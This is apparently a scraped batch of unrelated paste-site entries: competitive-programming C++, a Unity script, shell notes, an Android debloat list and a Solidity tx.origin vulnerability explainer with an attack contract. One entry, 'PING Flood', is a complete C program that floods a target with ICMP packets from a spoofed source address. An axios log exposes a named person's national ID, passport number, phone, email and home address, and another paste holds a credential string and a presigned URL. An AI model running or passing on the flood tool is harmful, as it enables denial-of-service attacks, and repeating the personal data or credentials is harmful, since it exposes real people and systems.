        cur += F(l - lb) + F(rb - r);
        if (l - lb) d[k].insert({lb, l});
        if (rb - r) d[k].insert({r, rb});
        return;
    }
    // here we're sure that our segment doesn't lie on one of already existing segments
    vector <pii> ss;
    for (auto it = it1; it != it2; ++it) {
        if (!inside(it->F, it->S, l, r)) {
            if (it->F < l) ss.pb({it->F, l});
            else ss.pb({r, it->S});
        }
        cur -= F(it->S - it->F);
    }
    d[k].erase(it1, it2);
    EACH(e, ss) {
        d[k].insert(e);
        cur += F(e.S - e.F);
    }
}
void add(int k, int l, int r) {
    del(k, l, r);
    int lb = l, rb = r;
    auto it1 = d[k].lower_bound({l, 0});
    if (it1 != d[k].begin() && prev(it1)->S == l) {
        --it1;
        lb = it1->F;
        cur -= F(it1->S - it1->F);
        d[k].erase(it1);
    }
    auto it2 = d[k].lower_bound({r, 0});
    if (it2 != d[k].end() && it2->F == r) {
        rb = it2->S;
        cur -= F(it2->S - it2->F);
        d[k].erase(it2);
    }
    cur += F(rb - lb);
    d[k].insert({lb, rb});
}
bool is_in(int k, int p) {
    auto it = d[k].lower_bound({p + 1, 0});
    if (it == d[k].begin()) return 0;
    return prev(it)->S > p;
}

void solve7() {
    FOR(i, 0, m) {
        int u, v; cin >> u >> v, --u, --v;
        if (u > v) add(1, v, v + 1);
        else add(0, u, u + 1);
    }
    cout << cur << endl;
    while (q--) {
        int op, u, v; cin >> op >> u >> v, --u, --v;
        if (op == 1) {
            if (u > v) add(1, v, v + 1);
            else add(0, u, u + 1);
        }
        else if (op == 2) {
            if (is_in(0, min(u, v))) del(0, min(u, v), max(u, v));
            else del(1, min(u, v), max(u, v));
        }
        else if (op == 3) {
            if (is_in(0, min(u, v))) del(0, min(u, v), max(u, v)), add(1, min(u, v), max(u, v));
            else del(1, min(u, v), max(u, v)), add(0, min(u, v), max(u, v));
        }
        else {
            if (u < v) del(1, u, v), add(0, u, v);
            else del(0, v, u), add(1, v, u);
        }
        cout << cur << endl;
    }
}

signed main() {
    fastIO;
    int rofl; cin >> rofl;
    cin >> n >> m >> q;
    if (rofl == 7) {
        solve7();
        return 0;
    }
    if (rofl > 2) return 0;
    FOR(i, 0, m) {
        int u, v; cin >> u >> v, --u, --v;
        g[u].insert(v), gg[u].insert(v), gg[v].insert(u);
    }
    cout << get() << endl;
    while (q--) {
        int op, u, v; cin >> op >> u >> v, --u, --v;
        if (op == 1) g[u].insert(v), gg[u].insert(v), gg[v].insert(u);
        else if (op == 2) {
            if (g[u].find(v) == g[u].end()) g[v].erase(u);
            else g[u].erase(v);
            gg[u].erase(v), gg[v].erase(u);
        }
        else if (op == 3) {
            if (g[u].find(v) == g[u].end()) g[u].insert(v), g[v].erase(u);
            else g[u].erase(v), g[v].insert(u);
        }
        else {
            path.clear();
            need = v;
            dfs(u);
            FOR(i, 1, sz(path)) {
                if (g[path[i]].find(path[i - 1]) == g[path[i]].end()) g[path[i]].insert(path[i - 1]), g[path[i - 1]].erase(path[i]);
            }
        }
        cout << get() << endl;
    }
}
"
CSh2xQQr,openol A 100,tiom4eg,C++,Tuesday 16th of January 2024 01:38:48 AM CDT,"#include <bits/stdc++.h>
// tiom4eg's precompiler options
// POGGERS POGGERS POGGERS POGGERS POGGERS POGGERS POGGERS
// IO settings
#define fastIO ios_base::sync_with_stdio(false); cin.tie(0)
// Quick types
#define ll long long
#define ld long double
//#define ull unsigned long long
#define pii pair <int, int>
#define vi vector <int>
#define mi vector <vector <int>>
// Quick functions
#define endl ""\n""
#define F first
#define S second
#define all(a) a.begin(), a.end()
#define sz(a) (int)(a.size())
#define pb push_back
#define mp make_pair
// Quick fors
#define FOR(i, a, b) for (int i = a; i < b; ++i)
#define FORS(i, a, b, c) for (int i = a; i < b; i += c)
#define RFOR(i, a, b) for (int i = a; i >= b; --i)
#define EACH(e, a) for (auto& e : a)
// Pragmas
#ifndef TIOM4EG
#pragma GCC optimize(""O3"") // let the chaos begin!
#pragma GCC target(""avx,avx2,tune=native"")
#pragma GCC comment(linker, ""/stack:200000000"")
#endif
// PBDS
#include <ext/pb_ds/assoc_container.hpp>
#include <ext/pb_ds/tree_policy.hpp>
#define pbds tree <int, null_type, less <int>, rb_tree_tag, tree_order_statistics_node_update>
using namespace __gnu_pbds;
// POGGERS POGGERS POGGERS POGGERS POGGERS POGGERS POGGERS
using namespace std;
mt19937 rng(chrono::duration_cast<chrono::milliseconds>(chrono::system_clock::now().time_since_epoch()).count());
//#define int long long
constexpr int INF = 1e9 + 7, MD = 998244353, MAX = 200007, LG = 19, R = 1 << LG, MOD = 1000000007, MOD2 = 1e9 + 9, B = 256;
const ll INFLL = 1e18 + 7;

int t[2 * R];
void upd(int l, int r) {
    for (l += R, r += R; l < r; l >>= 1, r >>= 1) {
        if (l & 1) t[l++]++;
        if (~r & 1) t[r--]++;
    }
    if (l == r) t[l]++;
}
int get(int p) {
    int s = 0;
    for (p += R; p; s += t[p], p >>= 1) {}
    return s;
}

signed main() {
    fastIO;
    int n, m; cin >> n >> m;
    vi a(n); EACH(e, a) cin >> e;
    vector <pii> qs;
    FOR(i, 0, n - 1) if (a[i + 1] - a[i] > m) {
        if (a[i + 1] - a[i] >= 2 * m) return !(cout << -1);
        int l = (a[i] + 1) % m, r = (a[i + 1] - m + 1) % m;
        if (l < r) qs.pb({l, r});
        else {
            qs.pb({l, m});
            if (r) qs.pb({0, r});
        }
    }
    vi xs;
    xs.pb(0), xs.pb(m);
    EACH(e, qs) xs.pb(e.F), xs.pb(e.S);
    sort(all(xs)), xs.erase(unique(all(xs)), xs.end());
    EACH(e, qs) upd(lower_bound(all(xs), e.F) - xs.begin(), lower_bound(all(xs), e.S) - (xs.begin() + 1));
    FOR(i, 0, sz(xs) - 1) if (!get(i)) return !(cout << xs[i]);
    cout << -1;
}
"
fLNVK8P9,Untitled,iko1133,JavaScript,Tuesday 16th of January 2024 01:00:12 AM CDT,"{
	""config"": {
		""adapter"": [""xhr"", ""http""],
		""baseURL"": ""https://api.benefits.ge/api/v1.0/"",
		""data"": ""{\""travelInfo\"":{\""coverageZoneId\"":43,\""currencyId\"":10,\""travelStartDate\"":\""2024-01-17\"",\""travelEndDate\"":\""2024-01-18\"",\""hasLuggageInsurance\"":false,\""contractPackageId\"":99499},\""client\"":{\""isSelfInsurance\"":true,\""isOthersInsurance\"":false,\""personalNumber\"":\""01005013472\"",\""birthDate\"":\""1988-06-19\"",\""firstName\"":\""მარიამ\"",\""lastName\"":\""თავართქილაძე\"",\""firstNameEng\"":\""Mariam\"",\""lastNameEng\"":\""Tavartkiladze\"",\""email\"":\""mmariamtavartkiladze@gmail.com\"",\""phoneNumber\"":\""557775477\"",\""passportNumber\"":\""JSB20\"",\""genderId\"":1,\""addressActual\"":\""თბილისი, აბაშიძის 35\"",\""amountText\"":\""0\""},\""insuredPersons\"":[],\""productManagementId\"":12,\""ibfonlineClientUserId\"":\""string\"",\""summaryInfo\"":{\""package\"":{\""id\"":0,\""name\"":\""string\"",\""currencyId\"":0,\""packageServices\"":[{\""id\"":0,\""name\"":\""string\"",\""limit\"":0,\""limitPerDay\"":0,\""limitText\"":\""string\"",\""franchiseText\"":\""string\""}]},\""totalAmountText\"":\""string\""}}"",
		""env"": {
			""Blob"": [Function Blob],
			""FormData"": [Function FormData]
		},
		""headers"": [Object],
		""maxBodyLength"": -1,
		""maxContentLength"": -1,
		""method"": ""post"",
		""timeout"": 0,
		""transformRequest"": [
			[Function transformRequest]
		],
		""transformResponse"": [
			[Function transformResponse]
		],
		""transitional"": {
			""clarifyTimeoutError"": false,
			""forcedJSONParsing"": true,
			""silentJSONParsing"": true
		},
		""url"": ""PolicyTravel/Application"",
		""validateStatus"": [Function validateStatus],
		""xsrfCookieName"": ""XSRF-TOKEN"",
		""xsrfHeaderName"": ""X-XSRF-TOKEN""
	},
	""data"": {
		""Error"": ""The specified URL cannot be found "",
		""Log-Id"": ""18d1110df4b-a792adc3"",
		""Request Time"": ""2024-01-16 06:58:54 GMT""
	},
	""duration"": 29,
	""headers"": {
		""connection"": ""Close"",
		""content-type"": ""application/json""
	},
	""ok"": false,
	""originalError"": [AxiosError: Request failed with status code 404],
	""problem"": ""CLIENT_ERROR"",
	""status"": 404
}"
CLpBKRp7,Split by N-Grams,bennyfromtheblock,Python,Tuesday 16th of January 2024 12:42:21 AM CDT,"class TrieNode:
    def __init__(self):
        self.isNgram = False
        self.children: Dict[str, TrieNode] = defaultdict(TrieNode)


class NgramDictionary:
    def __init__(self):
        self.root = TrieNode()

    def insert_ngram(self, ngram: str):
        tokens = ngram.split(' ')
        cur_node = self.root
        for token in tokens:
            cur_node = cur_node.children[token]
            
        cur_node.isNgram = True
    

def ngram_split(input:str, phrases: List[str]) -> List[str]:
    input_tokens = input.strip().split(' ')
    ngram_dict = NgramDictionary()

    for ngram in phrases:
        ngram_dict.insert_ngram(ngram)
    
    res = []
    i = 0
    
    # Assuming we want the longest possible n-gram every time
    # ex. input = 'we want ice cream', phrases = ['we want ice', 'we want ice cream']
    # output = ['we want ice cream']
    while i < len(input_tokens):
        j = i
        longest_ngram_end = i + 1
        cur_node = ngram_dict.root
        
        # find the longest ngram possible
        while j < len(input_tokens) and input_tokens[j] in cur_node.children:
            if cur_node.isNgram:
                longest_ngram_end = j + 1
            cur_node = cur_node.children[input_tokens[j]]
            j += 1
            
        res.append(' '.join(input_tokens[i : longest_ngram_end]))
        i = longest_ngram_end
        
    return res

# Time complexity: let P be the number of ngrams, N be the avg token length of the ngrams, and M be the token length of input
# Constructing trie (NgramDictinary) is O(P*N), doing the splitting is O(M^2), so in total: O(max(P*N, M^2))

# Space complexity:
# O(P*N), since each n-gram creates (at max) N nodes in the Trie, and there are P n-grams."
9NjF0fTH,PING Flood,opencard,C,Monday 15th of January 2024 11:59:30 PM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <unistd.h>
typedef unsigned char u8;
typedef unsigned short int u16;
unsigned short in_cksum(unsigned short *ptr, int nbytes);
void help(const char *p);
int main(int argc, char **argv)
{
    if (argc < 3) 
    {
        printf(""KeyViewer PING FLOOD\nИспользование: %s <Отправитель> <Получатель> [размер сообщения]\n"", argv[0]);
        exit(0);
    }
    unsigned long daddr;
    unsigned long saddr;
    int payload_size = 0, sent, sent_size;
    saddr = inet_addr(argv[1]);
    daddr = inet_addr(argv[2]);
    if (argc > 3)
    {
        payload_size = atoi(argv[3]);
    }
    int sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
    
    if (sockfd < 0) 
    {
        perror(""Не удалось создать сокет"");
        return (0);
    }
    int on = 1;
    if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (const char*)&on, sizeof (on)) == -1) 
    {
        perror(""setsockopt"");
        return (0);
    }
    if (setsockopt (sockfd, SOL_SOCKET, SO_BROADCAST, (const char*)&on, sizeof (on)) == -1) 
    {
        perror(""setsockopt"");
        return (0);
    }
    int packet_size = sizeof (struct iphdr) + sizeof (struct icmphdr) + payload_size;
    char *packet = (char *) malloc (packet_size);           
    if (!packet) 
    {
        perror(""out of memory"");
        close(sockfd);
        return (0);
    }
    struct iphdr *ip = (struct iphdr *) packet;
    struct icmphdr *icmp = (struct icmphdr *) (packet + sizeof (struct iphdr));
    memset (packet, 0, packet_size);
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons (packet_size);
    ip->id = rand ();
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_ICMP;
    ip->saddr = saddr;
    ip->daddr = daddr;
      icmp->type = ICMP_ECHO;
    icmp->code = 0;
      icmp->un.echo.sequence = rand();
      icmp->un.echo.id = rand();
    icmp->checksum = 0;
    struct sockaddr_in servaddr;
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = daddr;
    memset(&servaddr.sin_zero, 0, sizeof (servaddr.sin_zero));
    puts(""Флуд..."");
    while (1)
    {
        memset(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), rand() % 255, payload_size);
        icmp->checksum = 0;
        icmp->checksum = in_cksum((unsigned short *)icmp, sizeof(struct icmphdr) + payload_size);
        if ( (sent_size = sendto(sockfd, packet, packet_size, 0, (struct sockaddr*) &servaddr, sizeof (servaddr))) < 1) 
        {
            perror(""Ошибка отправки\n"");
            break;
        }
        ++sent;
        printf(""%d Пакетов отправлено\r"", sent);
        fflush(stdout);    
        usleep(10000);
    }
    free(packet);
    close(sockfd);
    return (0);
}
unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
    register long sum;
    u_short oddbyte;
    register u_short answer;
    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *) & oddbyte) = *(u_char *) ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return (answer);
}"
cSZqUWrX,UI Dragging,Krythic,C#,Monday 15th of January 2024 11:48:04 PM CDT,"using UnityEngine;
using UnityEngine.EventSystems;

public class DraggableControl : MonoBehaviour,
    IPointerDownHandler, IPointerUpHandler, IDragHandler
{
    public GameObject parent;
    public Canvas canvas;
    private bool _isDragging;
    private Vector3 _offset;

    // Start is called before the first frame update
    void Start()
    {

    }

    public void OnPointerDown(PointerEventData eventData)
    {
        _isDragging = true;
        _offset = eventData.position - new Vector2(parent.transform.position.x, parent.transform.position.y);
    }

    public void OnPointerUp(PointerEventData eventData)
    {
        _isDragging = false;
    }

    public void OnDrag(PointerEventData eventData)
    {
        if (_isDragging)
        {
            Vector3 position = new Vector3(Input.mousePosition.x, Input.mousePosition.y, 0f) - _offset;
            parent.transform.position = position;
            /**
             * TODO Tomorrow
             * Move the two getcomponent calls up to the OnPointerDown handler, so we only call it once while
             * the playeris dragging the ui element, instead of every frame that it is dragging.
             */
            ClampToWindow(
                position,
                parent.GetComponent<RectTransform>(),
                canvas.GetComponent<RectTransform>());
        }
    }

    private void ClampToWindow(Vector3 mousePosition, RectTransform parentRect, RectTransform canvasRect)
    {
        parentRect.transform.position = mousePosition;
        Vector3 pos = parentRect.localPosition;
        Vector3 minPosition = canvasRect.rect.min - parentRect.rect.min;
        Vector3 maxPosition = canvasRect.rect.max - parentRect.rect.max;
        pos.x = Mathf.Clamp(parentRect.localPosition.x, minPosition.x, maxPosition.x);
        pos.y = Mathf.Clamp(parentRect.localPosition.y, minPosition.y, maxPosition.y);
        parentRect.localPosition = pos;
    }
}
"
btRAAVVY,Untitled,kwest87,C#,Monday 15th of January 2024 11:17:33 PM CDT,"using System;

namespace ConsoleApp27
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int[] numbers = { 1, 2, 3, 4, 5 };
            int temporaryNumber;
            int shift;

            Console.WriteLine(""Сколь раз сдвинуть массив влево : "");
            shift = Convert.ToInt32(Console.ReadLine());
            shift %= numbers.Length;

            for (int j = 0; j < shift; shift--)
            {
                temporaryNumber = numbers[0];

                for (int i = 0; i < numbers.Length - 1; i++)
                {
                    numbers[i] = numbers[i + 1];
                }

                numbers[numbers.Length - 1] = temporaryNumber;
            }

            for (int i = 0; i < numbers.Length; i++)
            {
                Console.Write(numbers[i] + "" "");
            }
        }
    }
}"
NX6EceZX,Using Droidcam on Linux with V4L2,chadjoan,Bash,Monday 15th of January 2024 11:00:21 PM CDT,"# Possibly optional steps that improve resolution.
# These must be done as `root`.
# Source: https://www.dev47apps.com/droidcam/linux/
rmmod v4l2loopback-dc
insmod /lib/modules/`uname -r`/video/v4l2loopback-dc.ko width=1920 height=1080

# Open DroidCam(X) on Android device. Start it up. Get IP address and port.
# In this example, the IP address is 192.168.1.39 and the port is 4747.

# Put this in one shell to create a /dev/videoN node that other programs can connect to.
# (I did this as `root`, but I'm not sure if `root` is needed.)
droidcam-cli -a -v 192.168.1.39 4747
#```
#Client v2.0.0
#Video: /dev/video0
#Audio: hw:3,1,0
#```

# Alternatively, if the device has ADB debugging over USB enabled
# in its developer options, then droidcam-cli can connect this way
# over a USB3.0 wire:
droidcam-cli -a -v adb 4747

# This connection seems to have MUCH better bandwidth/framerate!
#
# If connecting from a new computer, the phone might get a prompt
# asking whether the computer should be trusted. This prompt must
# be answered affirmatively before the above `adb` mode will work.
# After answering the prompt, it may also be necessary to restart
# the DroidCam(X) app on the phone/device, and possibly also
# necessary to restart `droidcam-cli` with the same command above.
# If all is good, it will give the same output as the IP version.

# It should now be possible to use the ""webcam"" from other programs, and from web apps like Discord.
# (This should be done as the user in the desktop environment, NOT as root.)
# To test functionality manual, `mpv` can be used like so:
mpv av://v4l2:/dev/video0 --profile=low-latency --untimed
#```
# (+) Video --vid=1 (rawvideo 1920x1080 30.000fps)
#VO: [gpu] 1920x1080 yuv420p
#V: 02:08:20 / 02:08:20 (100%)
#```
# NOTE that the `/dev/video0` in this command must match the ""Video:"" field from droidcam-cli.
# It just happened to be `/dev/video0` in this example, but it could be any `/dev/videoN` node.
"
QBva7r4d,for xda,tdbone1,Bash,Monday 15th of January 2024 09:53:13 PM CDT,"# Preset created in ADB AppControl 1.8.3.1
# Total applications: 100
# 2024-01-15_21:51:56
# Samsung SM-G998B Uninstalled applications
com.android.apps.tag
com.android.bips
com.android.bookmarkprovider
com.android.cts.priv.ctsshim
com.android.dreams.basic
com.android.dreams.phototable
com.android.dynsystem
com.android.egg
com.android.hotwordenrollment.okgoogle
com.android.hotwordenrollment.xgoogle
com.android.managedprovisioning
com.android.printspooler
com.android.providers.partnerbookmarks
com.android.stk
com.android.stk2
com.android.traceur
com.android.vending
com.android.wallpaper.livepicker
com.diotek.sec.lookup.dictionary
com.google.android.apps.restore
com.google.android.apps.turbo
com.google.android.cellbroadcastreceiver
com.google.android.configupdater
com.google.android.feedback
com.google.android.gms
com.google.android.gms.location.history
com.google.android.googlequicksearchbox
com.google.android.onetimeinitializer
com.google.android.partnersetup
com.google.android.printservice.recommendation
com.google.android.projection.gearhead
com.google.android.setupwizard
com.google.android.syncadapters.calendar
com.google.android.tts
com.google.audio.hearing.visualization.accessibility.scribe
com.monotype.android.font.foundation
com.osp.app.signin
com.samsung.android.accessibility.talkback
com.samsung.android.allshare.service.mediashare
com.samsung.android.app.camera.sticker.facearavatar.preload
com.samsung.android.app.clipboardedge
com.samsung.android.app.cocktailbarservice
com.samsung.android.app.omcagent
com.samsung.android.app.reminder
com.samsung.android.app.routines
com.samsung.android.app.settings.bixby
com.samsung.android.app.sharelive
com.samsung.android.app.taskedge
com.samsung.android.app.updatecenter
com.samsung.android.app.watchmanagerstub
com.samsung.android.aware.service
com.samsung.android.bbc.bbcagent
com.samsung.android.beaconmanager
com.samsung.android.bixby.agent
com.samsung.android.bixbyvision.framework
com.samsung.android.calendar
com.samsung.android.da.daagent
com.samsung.android.dynamiclock
com.samsung.android.easysetup
com.samsung.android.fmm
com.samsung.android.forest
com.samsung.android.game.gamehome
com.samsung.android.game.gametools
com.samsung.android.gru
com.samsung.android.ipsgeofence
com.samsung.android.mdx
com.samsung.android.mobileservice
com.samsung.android.net.wifi.wifiguider
com.samsung.android.networkstack.tethering.overlay
com.samsung.android.peripheral.framework
com.samsung.android.rubin.app
com.samsung.android.scloud
com.samsung.android.sdm.config
com.samsung.android.service.peoplestripe
com.samsung.android.service.stplatform
com.samsung.android.smartmirroring
com.samsung.android.stickercenter
com.samsung.android.svoiceime
com.samsung.android.visionintelligence
com.samsung.app.newtrim
com.samsung.cmfa.AuthTouch
com.samsung.SMT
com.samsung.storyservice
com.sec.android.app.chromecustomizations
com.sec.android.app.clockpackage
com.sec.android.app.desktoplauncher
com.sec.android.app.dexonpc
com.sec.android.app.magnifier
com.sec.android.app.safetyassurance
com.sec.android.app.samsungapps
com.sec.android.app.SecSetupWizard
com.sec.android.app.setupwizardlegalprovider
com.sec.android.autodoodle.service
com.sec.android.daemonapp
com.sec.android.desktopmode.uiservice
com.sec.android.easyMover.Agent
com.sec.android.soagent
com.sec.enterprise.knox.cloudmdm.smdms
com.sec.location.nsflp2
com.sec.spp.push
"
9YEL7Xfw,Linux. Unzip. Test integrity of ZIP file,sytchenko,Bash,Monday 15th of January 2024 09:36:51 PM CDT,unzip -t archive.zip
j1jsDQrq,Smart Contract Vulnerability - Authorization Through tx.origin,FlyFar,Email,Monday 15th of January 2024 09:06:06 PM CDT,"Authorization Through tx.origin
tx.origin is a global variable in Solidity which returns the address that sent a transaction. It's important that you never use tx.origin for authorization since another contract can use a fallback function to call your contract and gain authorization since the authorized address is stored in tx.origin. Consider this example:

pragma solidity >=0.5.0 <0.7.0;

// THIS CONTRACT CONTAINS A BUG - DO NOT USE
contract TxUserWallet {
    address owner;

    constructor() public {
        owner = msg.sender;
    }

    function transferTo(address payable dest, uint amount) public {
        require(tx.origin == owner);
        dest.transfer(amount);
    }
}

Here we can see that the TxUserWallet contract authorizes the transferTo() function with tx.origin.

pragma solidity >=0.5.0 <0.7.0;

interface TxUserWallet {
    function transferTo(address payable dest, uint amount) external;
}

contract TxAttackWallet {
    address payable owner;

    constructor() public {
        owner = msg.sender;
    }

    function() external {
        TxUserWallet(msg.sender).transferTo(owner, msg.sender.balance);
    }
}

Now if someone were to trick you into sending ether to the TxAttackWallet contract address, they can steal your funds by checking tx.origin to find the address that sent the transaction.

To prevent this kind of attack, use msg.sender for authorization.

Examples from: https://solidity.readthedocs.io/en/develop/security-considerations.html#tx-origin

Sources
https://swcregistry.io/docs/SWC-115
https://solidity.readthedocs.io/en/develop/security-considerations.html#tx-origin
https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/tx-origin/
https://github.com/sigp/solidity-security-blog#tx-origin"
qkdSEmc0,Untitled,BayangBec,JSON,Monday 15th of January 2024 08:53:46 PM CDT,"[
  {
    catalog_id: '08186bc0-07fb-4867-a163-67c98dec43e3',
    catalog_url: 'https://dev-storage-mccp.mocogawe.com/original/publication/book/file/5fa35fc63f30a67fd2dfdeeffabb58747fa416faff6b7b80720c3f6e41053984.pdf?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=minio%2F20231215%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20231215T034555Z&X-Amz-Expires=7200&X-Amz-SignedHeaders=host&X-Amz-Signature=b64f413ff65512a2d20f8a9b0f46573b2cf0f31a5f7b328302f658e1d1cde2a8'
  }
]"
Fuf9tYpt,Untitled,BayangBec,JSON,Monday 15th of January 2024 08:47:50 PM CDT,"{
  ""data"": [
    {
      ""catalog_id"": ""841aed8d-1c43-4393-9b6a-8fcb4eaaed25"",
      ""created_at"": ""2024-01-16T01:58:10.698Z"",
      ""epustaka_id"": ""bf61f006-e90a-4c36-a6c8-d5b566a2a088"",
      ""epustaka_catalog_qty"": 2
    }
  ],
  ""app_id"": ""6453b42c-a3f6-434d-ae6f-1071f148f24e"",
  ""config"": {
    ""url"": ""https://dev-api-agent-manager.mocogawe.com/agent-manager"",
    ""header"": {
      ""headers"": {
        ""Accept"": ""application/json"",
        ""Content-Type"": ""application/json"",
        ""Access-Control-Allow-Origin"": true
      }
    },
    ""method"": ""post"",
    ""endpoint"": ""activation/content""
  },
  ""credential"": ""454f6a64324f5958534a4a445233626f2f79754834356b456f6b5538755036346d357a4a6d65526c6b356a48466162656d4f35794250623458364c6c375956612b326e2f674f6169347256724a61324f5a66437441413d3d""
}"
rpevXg59,Loop breaking II.,alansam,C++,Monday 15th of January 2024 08:29:46 PM CDT,"/*
 * Trying to refactor someone else's code from codingame website.
 * I am trying to replace a massive if else block with a switch statement.
 * I cannot figure out why my statement is not equivalent to there's.
 * Sorry for the long post. My Git seems broken lately.
 * Can someone explain please?
 */

#include <iostream>
#include <iomanip>
#include <string>
#include <vector>
#include <algorithm>

#define SWITCH_

namespace js {
static constexpr auto L { 8 };
static constexpr auto C { 8 };
static auto N { 0 };

static
std::vector<std::string> rows = {
  {""########""},
  {""# @    #""},
  {""#     X#""},
  {""# XXX  #""},
  {""#   XX #""},
  {""#   XX #""},
  {""#     $#""},
  {""########""}
};

std::pair<int, int> move(std::string s, std::pair<int, int> lpos) {
  if      (s == ""SOUTH"") { lpos.second++; }
  else if (s == ""WEST"")  { lpos.first--; }
  else if (s == ""EAST"")  { lpos.first++; }
  else if (s == ""NORTH"") { lpos.second--; }
  return lpos;
}

bool isPassable(std::string dir, std::pair<int, int> pos, bool dis) {
  std::pair<int, int> npos = move(dir, pos);
  if (npos.first < 0 || npos.second < 0 || npos.first >= C || npos.second >= L) {
    return false;
  }
  auto c = rows[npos.second][npos.first];
  return !(c == '#' || (c == 'X' && !dis));
}

} /* namespace js */

int main() {
  std::pair<int, int> pos;
  std::vector<std::string> directions = { ""SOUTH"", ""EAST"", ""NORTH"", ""WEST"" };
  std::vector<std::pair<int, int>> tl;
  std::string out = """";
  auto BM { false };
  js::rows.resize(js::L);
  for (auto i = 0ul; i < js::L; i++) {
    auto f = js::rows[i].find(""@"");
    if (f != std::string::npos) {
      pos = std::make_pair(f, i);
    }
    for (auto j = 0ul; j < js::rows[i].size(); j++) {
      if (js::rows[i][j] == 'T') {
        tl.emplace_back(j, i);
      }
    }
  }

  std::string dir = ""SOUTH"";
  /* loop forever */ while (true) {
    if (!js::isPassable(dir, pos, BM)) {
      for (auto const & ds : directions) {
        if (js::isPassable(ds, pos, BM)) {
          dir = ds;
          break;
        }
      }
    }

    out += dir + ""\n"";
    pos = js::move(dir, pos);

    char block = js::rows[pos.second][pos.first];
#ifdef SWITCH_
    //My Way...Seems to loop infinitely.
    auto complete { false }; /* flag for loop termination - initially false */
    switch (block) {
      case 'X':
        js::rows[pos.second].replace(pos.first, 1, "" "");
        break;

      case '$':
        /* loop should terminate - set flag */
 		    complete = true;
        break;

      default:
        for (auto const & ds : directions) {
          if (ds[0] == block) {
            dir = ds;
            break;
          }
        }
    }
    if (complete) { /* terminate forever loop */ break; }
#else
    //Their Way...Works
    if (block == 'X') {
      rows[pos.second].replace(pos.first, 1, "" "");
    }
    else if (block == '$') { 
      break;
    }
    else {
      for (auto const & ds : directions) {
        if (ds[0] == block) {
          dir = ds;
          /* terminate forever loop */  break;
        }
      }
    }
#endif

    // Loop check
    js::N++;
    if (js::N > js::C * js::L) {
      out = ""LOOP\n"";
      break;
    }
  }
  std::cout << out;
}
"
